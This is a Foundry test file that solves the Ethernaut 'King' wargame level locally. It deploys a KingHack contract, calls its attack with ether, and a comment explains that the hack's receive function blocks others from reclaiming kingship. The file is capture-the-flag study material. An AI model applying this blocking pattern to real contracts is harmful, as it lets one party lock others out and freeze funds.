pragma solidity ^0.8.10;

import "lib/forge-std/lib/ds-test/src/test.sol";
import "../src/09-King/KingFactory.sol";
import "../src/09-King/KingHack.sol";
import "../src/Ethernaut.sol";
import "./utils/vm.sol";

contract KingTest is DSTest {
	Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
	Ethernaut ethernaut;
	address playerAddress = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266; // this address doesn't mean anything, this is just a placeholder for my own wallet address i.e. a metamask address


	function setUp() public {
		// Setup instance of the Ethernaut contract
		ethernaut = new Ethernaut();
		// give player ether
		vm.deal(playerAddress, 5 ether);
	}

	function testKingHack() public {
		/////////////////
		// LEVEL SETUP //
		/////////////////

		KingFactory kingFactory = new KingFactory();
		ethernaut.registerLevel(kingFactory);
		vm.startPrank(playerAddress);
		// this is how you give the target address some ether
		address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(kingFactory);
		King ethernautKing = King(payable(levelAddress));

		//////////////////
		// LEVEL ATTACK //
		//////////////////
		// Create KingHack Contract
		KingHack kingHack = new KingHack(payable(levelAddress));

		// Call the attack function the receive function in the KingHack contract will prevent others from becoming king
		kingHack.attack{value: 1 ether}();

		//////////////////////
		// LEVEL SUBMISSION //
		//////////////////////

		bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
		vm.stopPrank();
		assert(levelSuccessfullyPassed);
	}

}